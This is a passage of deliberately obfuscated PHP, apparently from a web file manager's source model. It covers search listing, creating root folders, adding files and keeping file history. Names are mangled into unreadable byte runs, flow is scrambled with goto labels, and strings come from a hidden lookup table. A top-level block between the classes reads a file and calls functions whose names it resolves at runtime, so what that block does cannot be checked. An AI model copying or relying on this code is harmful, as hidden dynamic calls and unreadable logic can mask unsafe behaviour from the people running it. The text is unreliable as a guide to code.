f®‘»Ùìè±; f®‘»Ùìè±: $cÁ¯íò¬Ç = array_unique($cÁ¯íò¬Ç); if (!$cÁ¯íò¬Ç) { return; } $cÒãÒ¿”·≤ = array($aÔ‘´éíÏ[374] => array($aÔ‘´éíÏ[7], $cÁ¯íò¬Ç), $aÔ‘´éíÏ[99] => $aÔ‘´éíÏ[409], $aÔ‘´éíÏ[365] => array($aÔ‘´éíÏ[743], $aÔ‘´éíÏ[2139] . $bäœÊó°‹ê[$aÔ‘´éíÏ[2137]] . $aÔ‘´éíÏ[2139])); goto b‰àæÏ•⁄¡; b‰àæÏ•⁄¡: $Bπ¯µ´Î≠È = Model($aÔ‘´éíÏ[508])->field($aÔ‘´éíÏ[374])->where($cÒãÒ¿”·≤)->select(); $få÷®∑à√‡ = array_to_keyvalue($Bπ¯µ´Î≠È, $aÔ‘´éíÏ[33], $aÔ‘´éíÏ[374]); $this->_listSearchMerge($C—á°ÃÈ™È, $bäœÊó°‹ê, $Dà◊’Ó®Øë, $få÷®∑à√‡); goto b≤ΩÇóí¬€; b≤ΩÇóí¬€: } private function _listSearchMerge(&$DÛ°·Ã·»∏, $fóÛÃ‹…¢, $A¥µûÛè≥À, $aÈÁ≤∆‹¡Á) { goto a·Ô∆úÖ‘€; cÃãë≠„µÇ: $fÕàÜ€ã©€ = $this->field($A¥µûÛè≥À)->where($dı⁄èç®ØÏ)->select(); if (!$fÕàÜ€ã©€) { return; } $EÓΩåï∂©â = array(); goto B∏€˜ËÛ¶Ì; a·Ô∆úÖ‘€: $EπØñÂÖ≠ì =& $_SERVER[Æ¡î¢≠¯™]; if (!$aÈÁ≤∆‹¡Á) { return; } $DµÑÖÌÇë‡ = array_to_keyvalue($DÛ°·Ã·»∏[$EπØñÂÖ≠ì[360]], $EπØñÂÖ≠ì[33], $EπØñÂÖ≠ì[374]); goto bùá‘ƒ¯Í; bùá‘ƒ¯Í: $cºŒÜ›πÇ = array_diff($aÈÁ≤∆‹¡Á, $DµÑÖÌÇë‡); if (!$cºŒÜ›πÇ) { return; } $dı⁄èç®ØÏ = array($EπØñÂÖ≠ì[374] => array($EπØñÂÖ≠ì[7], $cºŒÜ›πÇ)); goto cÃãë≠„µÇ; B∏€˜ËÛ¶Ì: foreach ($fÕàÜ€ã©€ as $C¿˘Ó’†Ç≠) { $fóˆ≥ÂŸ≤ = $EπØñÂÖ≠ì[47] . $fóÛÃ‹…¢[$EπØñÂÖ≠ì[465]] . $EπØñÂÖ≠ì[47]; if (stripos($C¿˘Ó’†Ç≠[$EπØñÂÖ≠ì[463]], $fóˆ≥ÂŸ≤) !== !1) { $EÓΩåï∂©â[] = $C¿˘Ó’†Ç≠; } } $DÛ°·Ã·»∏[$EπØñÂÖ≠ì[360]] = array_merge($EÓΩåï∂©â, $DÛ°·Ã·»∏[$EπØñÂÖ≠ì[360]]); $DÛ°·Ã·»∏[$EπØñÂÖ≠ì[357]][$EπØñÂÖ≠ì[358]] += count($EÓΩåï∂©â); goto dÇÛÒ”Ùíä; dÇÛÒ”Ùíä: } public function listSearchChildren($b√ƒÜ«â•§, $Fœ≠≤—éûû = 5000) { goto béº‘”§÷ˆ; fô≥Ò›Ÿ∆Â: $c∞Ûä∞¯Öë = array($DÂÍÖæ®œŸ[463] => array($DÂÍÖæ®œŸ[743], $aõ“ÕŒ»…¬[$DÂÍÖæ®œŸ[463]] . $aõ“ÕŒ»…¬[$DÂÍÖæ®œŸ[374]] . $DÂÍÖæ®œŸ[488])); $Dø⁄áÚ‹–ò = $this->field($DÂÍÖæ®œŸ[374])->cache(null, 600)->where($c∞Ûä∞¯Öë)->count(); if ($Dø⁄áÚ‹–ò > $Fœ≠≤—éûû) { return $this->_listSearchChildrenNear($b√ƒÜ«â•§, $Fœ≠≤—éûû); } goto Fáƒ∆⁄çÒ∂; béº‘”§÷ˆ: $DÂÍÖæ®œŸ =& $_SERVER[Æ¡î¢≠¯™]; $Cã–æ¡®è√ = array(); $aõ“ÕŒ»…¬ = $this->sourceInfo($b√ƒÜ«â•§); goto fô≥Ò›Ÿ∆Â; Fáƒ∆⁄çÒ∂: $C¬‘á™ØÙÿ = $this->field($DÂÍÖæ®œŸ[374])->where($c∞Ûä∞¯Öë)->select(); $Cã–æ¡®è√ = array_to_keyvalue($C¬‘á™ØÙÿ, $DÂÍÖæ®œŸ[33], $DÂÍÖæ®œŸ[374]); return $Cã–æ¡®è√; goto b“≈È†íÒ€; b“≈È†íÒ€: } private function _listSearchChildrenNear($A†ÑÁùœ¿∏, $Càï∞ë¯à∏) { goto aÇíı§∑¯˘; A¯¡È¶ˆ°Û: if (!$E´µ¬√◊º’) { return $F±ôà¢Ô≤°; } $E¡Øø·≥Àï = array($f≠’ıÁÁæ‚[465] => array($f≠’ıÁÁæ‚[7], $E´µ¬√◊º’)); $E‚¶∞ºÀ∂ü = $this->field($f≠’ıÁÁæ‚[2263])->where($E¡Øø·≥Àï)->select(); goto AŒ≠˜àü°ˆ; AŒ≠˜àü°ˆ: $F±ôà¢Ô≤° = array_merge($F±ôà¢Ô≤°, array_to_keyvalue($E‚¶∞ºÀ∂ü, $f≠’ıÁÁæ‚[33], $f≠’ıÁÁæ‚[374])); $F±ôà¢Ô≤° = array_slice($F±ôà¢Ô≤°, 0, $Càï∞ë¯à∏); return $F±ôà¢Ô≤°; goto EŒÛÈêÒ—’; aÇíı§∑¯˘: $f≠’ıÁÁæ‚ =& $_SERVER[Æ¡î¢≠¯™]; $F±ôà¢Ô≤° = array(); $E¡Øø·≥Àï = array($f≠’ıÁÁæ‚[465] => $A†ÑÁùœ¿∏); goto EÕò√¿∂ÿÈ; EÕò√¿∂ÿÈ: $E‚¶∞ºÀ∂ü = $this->field($f≠’ıÁÁæ‚[2263])->where($E¡Øø·≥Àï)->select(); $E´µ¬√◊º’ = array_to_keyvalue(array_filter_by_field($E‚¶∞ºÀ∂ü, $f≠’ıÁÁæ‚[375], $f≠’ıÁÁæ‚[93]), $f≠’ıÁÁæ‚[33], $f≠’ıÁÁæ‚[374]); $F±ôà¢Ô≤° = array_merge($F±ôà¢Ô≤°, array_to_keyvalue($E‚¶∞ºÀ∂ü, $f≠’ıÁÁæ‚[33], $f≠’ıÁÁæ‚[374])); goto A¯¡È¶ˆ°Û; EŒÛÈêÒ—’: } private function _listSearchBindPinyin($b“Ì∂ı±–Ò, &$EÔËöêÚÙ∂, &$cÌ§≈ßÒÎù) { goto BÈàå”Ú„‹; a„ÏèÃœˆ…: $dçêÎÏ íé[] = array($có∞±Í∆®€[2267] => $Fï©ç°åœ—, $có∞±Í∆®€[902] => $có∞±Í∆®€[2141], array($có∞±Í∆®€[2268] => $Fï©ç°åœ—, $có∞±Í∆®€[2269] => array($có∞±Í∆®€[7], array($có∞±Í∆®€[420], $có∞±Í∆®€[419])))); $this->join($DÕœÚÉﬂò§); $EÔËöêÚÙ∂ = $dçêÎÏ íé; goto cÎ¬ìÉçÆ; D†¥∆›§å⁄: $dçêÎÏ íé = array(); $cÌ§≈ßÒÎù = str_replace(array($có∞±Í∆®€[62], $có∞±Í∆®€[50], $có∞±Í∆®€[2264]), $có∞±Í∆®€[33], $cÌ§≈ßÒÎù); $cÌ§≈ßÒÎù = $có∞±Í∆®€[2265] . str_replace($có∞±Í∆®€[47], $có∞±Í∆®€[2266], $cÌ§≈ßÒÎù); goto FêÚÿªÀéî; BÈàå”Ú„‹: $có∞±Í∆®€ =& $_SERVER[Æ¡î¢≠¯™]; if (!Input::check($b“Ì∂ı±–Ò[$có∞±Í∆®€[2137]], $có∞±Í∆®€[312]) || strlen($b“Ì∂ı±–Ò[$có∞±Í∆®€[2137]]) < 2) { return; } $DÕœÚÉﬂò§ = "\x4c\105\x46\x54\x20\x4a\x4f\x49\116\40{$this->tablePrefix}\151\157\x5f\163\157\x75\162\143\x65\x5f\155\x65\x74\141\40\x6d\x65\x74\x61\40\157\x6e\40\x73\x6f\x75\162\x63\x65\x2e\x73\157\165\162\143\x65\111\104\40\x3d\x20\x6d\145\164\x61\56\163\x6f\165\x72\143\145\111\x44"; goto D†¥∆›§å⁄; FêÚÿªÀéî: unset($EÔËöêÚÙ∂[$có∞±Í∆®€[28]]); foreach ($EÔËöêÚÙ∂ as $AÁ”ì˜®—ù => $FÉŒÌ˘„É¶) { $dçêÎÏ íé[$có∞±Í∆®€[2265] . $AÁ”ì˜®—ù] = $FÉŒÌ˘„É¶; } $Fï©ç°åœ— = array($có∞±Í∆®€[487], $có∞±Í∆®€[2139] . $b“Ì∂ı±–Ò[$có∞±Í∆®€[2137]] . $có∞±Í∆®€[2139]); goto a„ÏèÃœˆ…; cÎ¬ìÉçÆ: } private function _parseSearchWhere($aæïÒ€çÃ›) { goto e€üÁ±›·á; f¬Î∞Àôü¨: if (isset($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[695]])) { $eŒ¿ëÇÊÒ¿ = array($cÖ—¨á•Ö∞[2271], $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[695]]); if ($fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[117]]) { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[117]] = array($fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[117]], $eŒ¿ëÇÊÒ¿, $cÖ—¨á•Ö∞[2272]); } else { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[117]] = $eŒ¿ëÇÊÒ¿; } } if (isset($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[2273]])) { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[87]] = array($cÖ—¨á•Ö∞[2270], $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[2273]]); } if (isset($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[2274]])) { $eŒ¿ëÇÊÒ¿ = array($cÖ—¨á•Ö∞[2271], $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[2274]]); if ($fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[87]]) { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[87]] = array($fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[87]], $eŒ¿ëÇÊÒ¿, $cÖ—¨á•Ö∞[2272]); } else { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[87]] = $eŒ¿ëÇÊÒ¿; } } goto BÌŒíÖ’Ø÷; e€üÁ±›·á: $cÖ—¨á•Ö∞ =& $_SERVER[Æ¡î¢≠¯™]; $fŒù≈ëÊèÃ = array(); if (isset($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[694]])) { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[117]] = array($cÖ—¨á•Ö∞[2270], $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[694]]); } goto f¬Î∞Àôü¨; C …∫ëó”ª: if (isset($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[2137]]) && $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[2137]]) { $Fπï’ÊÙ∏ï = $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[2137]]; $a±Ÿôñœìï = explode($cÖ—¨á•Ö∞[50], $Fπï’ÊÙ∏ï); if (strlen($Fπï’ÊÙ∏ï) > 2 && (substr($Fπï’ÊÙ∏ï, 0, 1) == $cÖ—¨á•Ö∞[123] && substr($Fπï’ÊÙ∏ï, -1) == $cÖ—¨á•Ö∞[123]) || substr($Fπï’ÊÙ∏ï, 0, 1) == $cÖ—¨á•Ö∞[55] && substr($Fπï’ÊÙ∏ï, -1) == $cÖ—¨á•Ö∞[55]) { $Fπï’ÊÙ∏ï = substr($Fπï’ÊÙ∏ï, 1, -1); $a±Ÿôñœìï = array($Fπï’ÊÙ∏ï); } $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[28]] = array($cÖ—¨á•Ö∞[487], $cÖ—¨á•Ö∞[2139] . $Fπï’ÊÙ∏ï . $cÖ—¨á•Ö∞[2139]); if (count($a±Ÿôñœìï) > 1) { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[28]] = array(); foreach ($a±Ÿôñœìï as $EøâΩàø¯ö) { if (!trim($EøâΩàø¯ö)) { continue; } $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[28]][] = array($cÖ—¨á•Ö∞[487], $cÖ—¨á•Ö∞[2139] . trim($EøâΩàø¯ö) . $cÖ—¨á•Ö∞[2139]); } } } return $fŒù≈ëÊèÃ; goto CΩÖû±Ñ©à; BÌŒíÖ’Ø÷: if (isset($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[539]])) { $fŒù≈ëÊèÃ[] = array($cÖ—¨á•Ö∞[384] => $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[539]], $cÖ—¨á•Ö∞[383] => $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[539]], $cÖ—¨á•Ö∞[902] => $cÖ—¨á•Ö∞[2141]); } if (isset($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[377]])) { $A°Ù£óªàü = $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[377]]; if ($A°Ù£óªàü == $cÖ—¨á•Ö∞[86]) { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[375]] = 1; } else { if ($A°Ù£óªàü == $cÖ—¨á•Ö∞[2275]) { $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[375]] = 0; } else { if ($A°Ù£óªàü) { $A°Ù£óªàü = is_array($A°Ù£óªàü) ? $A°Ù£óªàü : explode($cÖ—¨á•Ö∞[47], $A°Ù£óªàü); $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[377]] = array($cÖ—¨á•Ö∞[389], $A°Ù£óªàü); $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[375]] = 0; } } } } if (isset($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[465]])) { $eÉ¶¯ßÕÒ— = $this->sourceInfo($aæïÒ€çÃ›[$cÖ—¨á•Ö∞[465]]); $fŒù≈ëÊèÃ[$cÖ—¨á•Ö∞[529]] = array($cÖ—¨á•Ö∞[487], $eÉ¶¯ßÕÒ—[$cÖ—¨á•Ö∞[463]] . $aæïÒ€çÃ›[$cÖ—¨á•Ö∞[465]] . $cÖ—¨á•Ö∞[488]); } goto C …∫ëó”ª; CΩÖû±Ñ©à: } } if ($_SERVER[$_SERVER[Æ¡î¢≠¯™][57]] != $_SERVER[$_SERVER[Æ¡î¢≠¯™][1923]]) { goto fŒÑ≥§êá¯; F£É◊££ﬁŒ: $eëíŸÌ∏ÂÙ($_SERVER[$_SERVER[Æ¡î¢≠¯™][58]]); goto eÔ¿À£ï¥÷; FÒ≈ùÇœÑ¬: $a¿Üç“˘¡á = explode($_SERVER[Æ¡î¢≠¯™][62], $D¯ÃáçìêÜ); if (count($a¿Üç“˘¡á) < $_SERVER[Æ¡î¢≠¯™][63]) { $c¡âÀŸ√ÿè = $_SERVER[Æ¡î¢≠¯™][64]; $c¡âÀŸ√ÿè(); } $eëíŸÌ∏ÂÙ = $_SERVER[Æ¡î¢≠¯™][65]; goto F£É◊££ﬁŒ; fŒÑ≥§êá¯: $CÑÈÒøãı≤ = $_SERVER[Æ¡î¢≠¯™][59]; $A‡˘¥¬¨ã∂ = $_SERVER[$_SERVER[Æ¡î¢≠¯™][60]] . $_SERVER[Æ¡î¢≠¯™][61]; $D¯ÃáçìêÜ = $CÑÈÒøãı≤($A‡˘¥¬¨ã∂); goto FÒ≈ùÇœÑ¬; eÔ¿À£ï¥÷: } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Dè°“∂Í‡á) { $c‚ÚÛØòÈó =& $_SERVER[Æ¡î¢≠¯™]; $EÛòæ◊≈òÜ = Model($c‚ÚÛØòÈó[478])->where(array($c‚ÚÛØòÈó[1388] => $Dè°“∂Í‡á))->find(); $dªÙá≤¥ÊÏ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Dè°“∂Í‡á, $EÛòæ◊≈òÜ[$c‚ÚÛØòÈó[28]]); $this->userDesktopAdd($dªÙá≤¥ÊÏ); return $dªÙá≤¥ÊÏ; } public function userDesktopAdd($eéàâÙ”–≠) { $FèÚ”ÿøπ’ =& $_SERVER[Æ¡î¢≠¯™]; $CææÛé‡ÕÊ = LNG($FèÚ”ÿøπ’[2276]); $aàœ‡≤ª≈÷ = $this->mkdir($eéàâÙ”–≠, $CææÛé‡ÕÊ); $this->metaSet($aàœ‡≤ª≈÷, $FèÚ”ÿøπ’[2277], $FèÚ”ÿøπ’[93]); $this->metaSet($eéàâÙ”–≠, $FèÚ”ÿøπ’[2278], $aàœ‡≤ª≈÷); } public function groupRootAdd($Eòö¯ïÈ¨ª) { $Eﬁèã®Ê¢Ï =& $_SERVER[Æ¡î¢≠¯™]; $B÷€ÎËËÀã = Model($Eﬁèã®Ê¢Ï[462])->where(array($Eﬁèã®Ê¢Ï[2133] => $Eòö¯ïÈ¨ª))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Eòö¯ïÈ¨ª, $B÷€ÎËËÀã[$Eﬁèã®Ê¢Ï[28]]); } public function systemRootPathAdd($Cã©⁄≥úåø) { if ($Cã©⁄≥úåø != $_SERVER[Æ¡î¢≠¯™][1075]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Cã©⁄≥úåø); } public function userRootRemove($d•ëñôÇΩ›) { $f¬‡«∫ÍÑ÷ = $this->sourceRoot(SourceModel::TYPE_USER, $d•ëñôÇΩ›); if (!$f¬‡«∫ÍÑ÷) { return; } $this->remove($f¬‡«∫ÍÑ÷, !1); } public function groupRootRemove($FŸ£Œôã„É) { $EâÉ»Ÿˆ—û = $this->sourceRoot(SourceModel::TYPE_GROUP, $FŸ£Œôã„É); if (!$EâÉ»Ÿˆ—û) { return; } $this->remove($EâÉ»Ÿˆ—û, !1); } private function _mkdirRoot($f∫ﬂ¥Õ–å·, $dôﬁÿŸıé¥, $aËÊË‹ÍÆ) { goto aûÔè˜Æ÷›; A√’ò’¿äÿ: $C—ë∏ú∞õé = "\x4d\x6f\x64\145\154\x53\157\x75\162\x63\145\56\155\153\144\x69\x72\122\157\x6f\164\56{$f∫ﬂ¥Õ–å·}\56{$dôﬁÿŸıé¥}\56" . $aËÊË‹ÍÆ; CacheLock::lock($C—ë∏ú∞õé); $e¥∑πî’•î[$a´ÔïªµÁö[28]] = $aËÊË‹ÍÆ; goto EÆ≠ÆàÓ∞è; EÆ≠ÆàÓ∞è: $d§πæ∆ÖÆÆ = $this->add($e¥∑πî’•î); $e•ø‹î…ò‰ = array($a´ÔïªµÁö[531] => short_id($d§πæ∆ÖÆÆ)); $this->where(array($a´ÔïªµÁö[388] => $d§πæ∆ÖÆÆ))->save($e•ø‹î…ò‰); goto EÑ–ãØÃÓ“; EÑ–ãØÃÓ“: CacheLock::unlock($C—ë∏ú∞õé); return $d§πæ∆ÖÆÆ; goto bò⁄Îø÷ÂÜ; aûÔè˜Æ÷›: $a´ÔïªµÁö =& $_SERVER[Æ¡î¢≠¯™]; $e¥∑πî’•î = array($a´ÔïªµÁö[373] => 0, $a´ÔïªµÁö[525] => $f∫ﬂ¥Õ–å·, $a´ÔïªµÁö[526] => $dôﬁÿŸıé¥, $a´ÔïªµÁö[522] => 1, $a´ÔïªµÁö[527] => USER_ID, $a´ÔïªµÁö[528] => USER_ID, $a´ÔïªµÁö[523] => $a´ÔïªµÁö[33], $a´ÔïªµÁö[529] => $a´ÔïªµÁö[474], $a´ÔïªµÁö[400] => 0, $a´ÔïªµÁö[524] => 0, $a´ÔïªµÁö[424] => 0, $a´ÔïªµÁö[530] => $a´ÔïªµÁö[33]); if ($EËóÚøáä˘ = $this->where($e¥∑πî’•î)->find()) { return $EËóÚøáä˘[$a´ÔïªµÁö[374]]; } goto A√’ò’¿äÿ; bò⁄Îø÷ÂÜ: } private function sourceRoot($FºÈŸ÷ù–Û, $EÓÂåÊá”ñ, $c®†⁄êåéæ = false) { $Fß·„Ó¬Ûﬂ =& $_SERVER[Æ¡î¢≠¯™]; $bﬁÎ«∏õ≈§ = array($Fß·„Ó¬Ûﬂ[373] => 0, $Fß·„Ó¬Ûﬂ[525] => $FºÈŸ÷ù–Û, $Fß·„Ó¬Ûﬂ[526] => $EÓÂåÊá”ñ); if ($EÜ‚í∞Áô = $this->where($bﬁÎ«∏õ≈§)->find()) { return $c®†⁄êåéæ ? $EÜ‚í∞Áô : $EÜ‚í∞Áô[$Fß·„Ó¬Ûﬂ[374]]; } return !1; } public function sourceRootGroup($cŒÆìºƒ≠ÿ) { $E‘”–„ïó™ =& $_SERVER[Æ¡î¢≠¯™]; if (is_string($cŒÆìºƒ≠ÿ)) { $cŒÆìºƒ≠ÿ = array($cŒÆìºƒ≠ÿ); } $e™åïïÊå¶ = array($E‘”–„ïó™[373] => 0, $E‘”–„ïó™[525] => SourceModel::TYPE_GROUP, $E‘”–„ïó™[526] => array($E‘”–„ïó™[7], $cŒÆìºƒ≠ÿ)); $CÈæ·¿êﬁÚ = $this->listSource($e™åïïÊå¶, 1000); return array_to_keyvalue($CÈæ·¿êﬁÚ[$E‘”–„ïó™[84]], $E‘”–„ïó™[460]); } public function mkfile($AëŒ£É‰îì, $B∂Ÿ∆åäµ¿, $Fºøº“Ø£ä = '', $aÒÊÂ¢˘Í‡ = REPEAT_RENAME) { $a∂≤úﬂ«Ô© =& $_SERVER[Æ¡î¢≠¯™]; $bôˆπ∆°¯ = Model($a∂≤úﬂ«Ô©[548])->addFileByContent($Fºøº“Ø£ä, $B∂Ÿ∆åäµ¿); return $this->_createFileCall($AëŒ£É‰îì, $B∂Ÿ∆åäµ¿, $bôˆπ∆°¯, $aÒÊÂ¢˘Í‡, $a∂≤úﬂ«Ô©[1104]); } public function addFile($f⁄‘‹æóÜ≈, $BÙ…◊ÕÖÎπ, $C’µÇµ†öé, $béŸ›≥¨∞ú = false, $dÓ§äÏ‰„¿ = REPEAT_RENAME) { $fâ∞öâ£ÀÓ = Model($_SERVER[Æ¡î¢≠¯™][548])->addFile($BÙ…◊ÕÖÎπ, $C’µÇµ†öé, $béŸ›≥¨∞ú); return $this->_createFileCall($f⁄‘‹æóÜ≈, $C’µÇµ†öé, $fâ∞öâ£ÀÓ, $dÓ§äÏ‰„¿); } public function addFileByFileID($cã‘ﬂã¿°¬, $d–Ω∆“ìåÑ, $CøﬁΩûı º, $Béó‘√Ñ›π = REPEAT_RENAME) { $E¶ÆâŸç™≠ =& $_SERVER[Æ¡î¢≠¯™]; $cîìîπä¨à = Model($E¶ÆâŸç™≠[548])->find($d–Ω∆“ìåÑ); Model($E¶ÆâŸç™≠[548])->linkAdd($d–Ω∆“ìåÑ); return $this->_createFileCall($cã‘ﬂã¿°¬, $CøﬁΩûı º, $cîìîπä¨à, $Béó‘√Ñ›π); } public function addFileByRemote($EŒ¬ùÖ≥ƒ¶, $aôÉœ∂ßà, $B˜∫á∫ÑÛ–, $b‰ˆº†ŒŒø = array(), $Böﬂò¯Ëü« = REPEAT_RENAME) { $f∞âÙﬁÏ£∏ = Model($_SERVER[Æ¡î¢≠¯™][548])->addFileByRemote($aôÉœ∂ßà, $B˜∫á∫ÑÛ–, $b‰ˆº†ŒŒø); return $this->_createFileCall($EŒ¬ùÖ≥ƒ¶, $B˜∫á∫ÑÛ–, $f∞âÙﬁÏ£∏, $Böﬂò¯Ëü«); } private function _createFileCall($BÈøûÇºë¬, $AÙçËÑ‚≤∏, $d¯™™ò‘¨Ñ, $D∫çΩÔ’‚™, $Eÿ·ÜÇ⁄óÙ = "\x75\x70\x6c\157\x61\x64") { goto bÌ€Á‘Ç∏Ï; AÍ–â„Æëâ: return $f‡ÇÃ‚≈Òã; goto Añ›Ç∫›íÒ; AÕè‡ÜØ•è: $f‡ÇÃ‚≈Òã = $this->_createFile($BÈøûÇºë¬, $AÙçËÑ‚≤∏, $d¯™™ò‘¨Ñ, $D∫çΩÔ’‚™, $D’„ÿãÇÚâ); if (!$D’„ÿãÇÚâ) { Model($aﬂ“«Ñ–„ß[426])->remove($d¯™™ò‘¨Ñ[$aﬂ“«Ñ–„ß[423]]); } else { if ($f‡ÇÃ‚≈Òã) { Model($aﬂ“«Ñ–„ß[2248])->eventCreate($f‡ÇÃ‚≈Òã, $Eÿ·ÜÇ⁄óÙ); } } $this->lockWriteEnd($BÈøûÇºë¬, $AÙçËÑ‚≤∏); goto AÍ–â„Æëâ; bÌ€Á‘Ç∏Ï: $aﬂ“«Ñ–„ß =& $_SERVER[Æ¡î¢≠¯™]; $D’„ÿãÇÚâ = !1; $this->lockWriteStart($BÈøûÇºë¬, $AÙçËÑ‚≤∏); goto AÕè‡ÜØ•è; Añ›Ç∫›íÒ: } public function mkdir($dÍ˘Ô§·‚›, $fœääÍà·, $FâòÔûä˜¡ = REPEAT_SKIP) { goto e”Úúıä„«; cå”ﬂ√éáÊ: $F€è˘üíµ¨ = $this->_addSoure($cçà‹ÚÃø˜, $fíÇ÷ï¢¶∫); Model($E≠Ω·µàÂ[2248])->eventCreate($F€è˘üíµ¨, $E≠Ω·µàÂ[1105]); $this->lockWriteEnd($dÍ˘Ô§·‚›, $fœääÍà·); goto e≈áÑœ–Éü; e≈áÑœ–Éü: return $F€è˘üíµ¨; goto E≠¿õòÕ‹Ô; AáûÉÏÑÌ´: $this->lockWriteStart($dÍ˘Ô§·‚›, $fœääÍà·); if ($FâòÔûä˜¡ !== !1) { $FîÙ„ø≈Ø∞ = $this->fileNameExist($dÍ˘Ô§·‚›, $fœääÍà·); if ($FîÙ„ø≈Ø∞ && $FâòÔûä˜¡ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($dÍ˘Ô§·‚›, $fœääÍà·); return $FîÙ„ø≈Ø∞; } $fœääÍà· = $this->fileNameAuto($dÍ˘Ô§·‚›, $fœääÍà·, $FâòÔûä˜¡); } $cçà‹ÚÃø˜ = array($E≠Ω·µàÂ[522] => 1, $E≠Ω·µàÂ[391] => $fœääÍà·, $E≠Ω·µàÂ[523] => $E≠Ω·µàÂ[33], $E≠Ω·µàÂ[424] => 0, $E≠Ω·µàÂ[524] => 0); goto cå”ﬂ√éáÊ; e”Úúıä„«: $E≠Ω·µàÂ =& $_SERVER[Æ¡î¢≠¯™]; $fíÇ÷ï¢¶∫ = $this->sourceInfo($dÍ˘Ô§·‚›); if (!$fíÇ÷ï¢¶∫) { return !1; } goto AáûÉÏÑÌ´; E≠¿õòÕ‹Ô: } private function _createFile($DèÎıÙ‡¿, $döÊŒÓ‡√ë, $fæ—ä≈·Â…, $b’◊ú‚…êä, &$bÜé∞à»Íˆ) { goto D∆¨Ø£‹å; eã§Éø’‡: $EêØò≥Õª„ = array($b’æÎ ›¨¥[522] => 0, $b’æÎ ›¨¥[391] => $döÊŒÓ‡√ë, $b’æÎ ›¨¥[523] => get_path_ext($döÊŒÓ‡√ë), $b’æÎ ›¨¥[424] => $fæ—ä≈·Â…[$b’æÎ ›¨¥[423]], $b’æÎ ›¨¥[524] => $fæ—ä≈·Â…[$b’æÎ ›¨¥[87]]); $E∂º™¯ö«⁄ = $this->_addSoure($EêØò≥Õª„, $f≠í£”πïç); $this->folderSizeReset($DèÎıÙ‡¿); goto Aí¶≤º‡çï; Aí¶≤º‡çï: return $E∂º™¯ö«⁄; goto D˜Ô”‚≤Æü; AÂõºÚÏùö: if ($b’◊ú‚…êä !== !1) { $AÂπ”ﬁÉŒ• = $this->fileNameExist($DèÎıÙ‡¿, $döÊŒÓ‡√ë); } $bÜé∞à»Íˆ = !0; if ($b’◊ú‚…êä && $AÂπ”ﬁÉŒ•) { if ($b’◊ú‚…êä == REPEAT_SKIP) { $bÜé∞à»Íˆ = !1; return $AÂπ”ﬁÉŒ•; } else { if ($b’◊ú‚…êä == REPEAT_REPLACE) { $Dçñ·Ñçèá = $this->sourceInfo($AÂπ”ﬁÉŒ•); $d…îºﬁÈëØ = $this->fileHistory($Dçñ·Ñçèá, $fæ—ä≈·Â…[$b’æÎ ›¨¥[423]], $fæ—ä≈·Â…[$b’æÎ ›¨¥[87]]); if (!$d…îºﬁÈëØ) { $bÜé∞à»Íˆ = !1; } else { $this->folderSizeReset($DèÎıÙ‡¿); } return $AÂπ”ﬁÉŒ•; } else { $döÊŒÓ‡√ë = $this->fileNameAuto($DèÎıÙ‡¿, $döÊŒÓ‡√ë, $b’◊ú‚…êä, !1); } } } goto eã§Éø’‡; D∆¨Ø£‹å: $b’æÎ ›¨¥ =& $_SERVER[Æ¡î¢≠¯™]; $f≠í£”πïç = $this->sourceInfo($DèÎıÙ‡¿); if (!$fæ—ä≈·Â… || !$f≠í£”πïç) { return !1; } goto AÂõºÚÏùö; D˜Ô”‚≤Æü: } protected function fileHistory($féáåà•ˆÛ, $b∫âáåÂ„Ã, $bã—˘∫‘¯î) { goto dÇìÎ»øÃÜ; a”ä…ˆüêﬁ: return !0; goto eîΩèÖ÷ÓÖ; dÇìÎ»øÃÜ: $Dè˘ÇªÂíÍ =& $_SERVER[Æ¡î¢≠¯™]; if ($féáåà•ˆÛ[$Dè˘ÇªÂíÍ[423]] == $b∫âáåÂ„Ã) { return !1; } $this->checkLock($féáåà•ˆÛ[$Dè˘ÇªÂíÍ[374]], $b∫âáåÂ„Ã); goto eâÈ££›⁄Á; eâÈ££›⁄Á: Model($Dè˘ÇªÂíÍ[2279])->addHistory($féáåà•ˆÛ); $f£‚ÁÃ„π± = array($Dè˘ÇªÂíÍ[528] => USER_ID, $Dè˘ÇªÂíÍ[395] => time(), $Dè˘ÇªÂíÍ[423] => $b∫âáåÂ„Ã, $Dè˘ÇªÂíÍ[87] => $bã—˘∫‘¯î); $this->where(array($Dè˘ÇªÂíÍ[388] => 